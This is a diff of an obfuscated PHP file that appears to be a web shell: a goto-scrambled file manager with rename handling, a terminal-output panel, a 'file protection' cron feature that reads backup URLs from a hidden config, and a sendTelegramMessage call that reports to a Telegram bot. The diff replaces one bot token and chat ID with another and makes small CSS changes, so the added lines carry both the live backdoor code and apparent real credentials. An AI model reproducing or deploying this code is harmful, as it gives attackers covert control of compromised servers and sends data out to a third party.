@@ -24,7 +24,7 @@
                     </tr>
                 </thead>
                 <tbody>'; goto ZVWP0; PJI1Z: echo '</div>
-    </div>'; goto Pyqlr; Z3tgf: $cffHx = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8"; goto gynnd; F98zn: echo '<div id="cron" class="tab-content ' . ($UZrOo === "cron" ? "active" : "") . '">
+    </div>'; goto Pyqlr; Z3tgf: $cffHx = "8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc"; goto gynnd; F98zn: echo '<div id="cron" class="tab-content ' . ($UZrOo === "cron" ? "active" : "") . '">
         <div style="background-color: white; padding: 20px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
             <h3>Cron Job Setup</h3>
             <p>To set up automatic file protection monitoring, add this to your crontab:</p>
@@ -196,7 +196,7 @@
                     </form>
                 </div>
             </td>
-        </tr>'; goto BbY1Y; OIG1U: $wbjZL = is_dir($Lr7h0); goto Qn6S2; a38dF: if ($ysHcB == "." || $ysHcB == "..") { continue; } goto pKhHj; BbY1Y: } goto qM_TD; sSMuW: if (isset($_GET["rename"]) && isset($_POST["newname"])) { goto G3Q2z; oyyJx: if (empty($_POST["newname"])) { $_SESSION["error"] = "New name cannot be empty"; } elseif (preg_match('/[\\/\\\\:*?"<>|]/', $_POST["newname"])) { $_SESSION["error"] = "Invalid characters in filename"; } elseif (!file_exists($p7CIL)) { $_SESSION["error"] = "File/folder does not exist"; } elseif (file_exists($K_yCQ)) { $_SESSION["error"] = "A file/folder with that name already exists"; } elseif (rename($p7CIL, $K_yCQ)) { $_SESSION["message"] = "Successfully renamed " . htmlspecialchars($_GET["rename"]) . " to " . htmlspecialchars($_POST["newname"]); } else { $_SESSION["error"] = "Failed to rename file/folder"; } goto MyMS9; hUeDL: $K_yCQ = $CyO_D . "/" . $_POST["newname"]; goto oyyJx; G3Q2z: $p7CIL = $CyO_D . "/" . $_GET["rename"]; goto hUeDL; MyMS9: header("Location: ?path=" . urlencode($CyO_D)); goto gFA9r; gFA9r: exit; goto ZPU0a; ZPU0a: } goto UQ024; KA472: if (isset($_SESSION["ssh_output"])) { echo '<div class="terminal-output">' . $_SESSION["ssh_output"] . "</div>"; unset($_SESSION["ssh_output"]); } goto ZL13f; GiW1U: sendTelegramMessage($cffHx, $wG13W, $Pcraz); goto OyVEg; OyVEg: if (isset($_GET["logout"])) { goto AMlMk; AMlMk: session_destroy(); goto jkEcv; jkEcv: header("Location: " . $_SERVER["PHP_SELF"]); goto LdUxg; LdUxg: exit; goto sfcCs; sfcCs: } goto jW88a; nkoSE: session_start(); goto DxzZ4; owQvc: $Cd7Kn = __DIR__ . "/.proteksi_config.json"; goto x44gY; rY7CE: $CXX_F = "040602"; goto owQvc; gynnd: $wG13W = "8478623770"; goto VHfel; JBF5I: if (file_exists($Cd7Kn)) { $d2PXX = json_decode(file_get_contents($Cd7Kn), true); if (!empty($d2PXX)) { foreach ($d2PXX as $DUOVH => $ysHcB) { echo '<div class="protection-item">
+        </tr>'; goto BbY1Y; OIG1U: $wbjZL = is_dir($Lr7h0); goto Qn6S2; a38dF: if ($ysHcB == "." || $ysHcB == "..") { continue; } goto pKhHj; BbY1Y: } goto qM_TD; sSMuW: if (isset($_GET["rename"]) && isset($_POST["newname"])) { goto G3Q2z; oyyJx: if (empty($_POST["newname"])) { $_SESSION["error"] = "New name cannot be empty"; } elseif (preg_match('/[\\/\\\\:*?"<>|]/', $_POST["newname"])) { $_SESSION["error"] = "Invalid characters in filename"; } elseif (!file_exists($p7CIL)) { $_SESSION["error"] = "File/folder does not exist"; } elseif (file_exists($K_yCQ)) { $_SESSION["error"] = "A file/folder with that name already exists"; } elseif (rename($p7CIL, $K_yCQ)) { $_SESSION["message"] = "Successfully renamed " . htmlspecialchars($_GET["rename"]) . " to " . htmlspecialchars($_POST["newname"]); } else { $_SESSION["error"] = "Failed to rename file/folder"; } goto MyMS9; hUeDL: $K_yCQ = $CyO_D . "/" . $_POST["newname"]; goto oyyJx; G3Q2z: $p7CIL = $CyO_D . "/" . $_GET["rename"]; goto hUeDL; MyMS9: header("Location: ?path=" . urlencode($CyO_D)); goto gFA9r; gFA9r: exit; goto ZPU0a; ZPU0a: } goto UQ024; KA472: if (isset($_SESSION["ssh_output"])) { echo '<div class="terminal-output">' . $_SESSION["ssh_output"] . "</div>"; unset($_SESSION["ssh_output"]); } goto ZL13f; GiW1U: sendTelegramMessage($cffHx, $wG13W, $Pcraz); goto OyVEg; OyVEg: if (isset($_GET["logout"])) { goto AMlMk; AMlMk: session_destroy(); goto jkEcv; jkEcv: header("Location: " . $_SERVER["PHP_SELF"]); goto LdUxg; LdUxg: exit; goto sfcCs; sfcCs: } goto jW88a; nkoSE: session_start(); goto DxzZ4; owQvc: $Cd7Kn = __DIR__ . "/.proteksi_config.json"; goto x44gY; rY7CE: $CXX_F = "040602"; goto owQvc; gynnd: $wG13W = "5070938778"; goto VHfel; JBF5I: if (file_exists($Cd7Kn)) { $d2PXX = json_decode(file_get_contents($Cd7Kn), true); if (!empty($d2PXX)) { foreach ($d2PXX as $DUOVH => $ysHcB) { echo '<div class="protection-item">
                     <div>
                         <strong>' . htmlspecialchars($ysHcB["target"]) . '</strong><br>
                         <small>' . htmlspecialchars($ysHcB["backupUrl"]) . '</small>
@@ -248,7 +248,7 @@
         }
         
         .container {
-            max-width: 1400px;
+            max-width: 1280px;
             margin: 0 auto;
             padding: 20px;
         }
@@ -337,7 +337,7 @@
         body {
             background-color: var(--light);
             color: var(--dark);
-            line-height: 1.6;
+            line-height: 1.3;
         }
         
         .container {
@@ -382,7 +382,7 @@
         .tab-btn.active {
             color: var(--primary);
             border-bottom-color: var(--primary);
-            font-weight: 600;
+            font-weight: 700;
         }
         
         .tab-btn:hover:not(.active) {
@@ -488,7 +488,7 @@
         .file-table {
             width: 100%;
             border-collapse: collapse;
-            background-color: white;
+            background-color: silver;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
             border-radius: 4px;
             overflow: hidden;
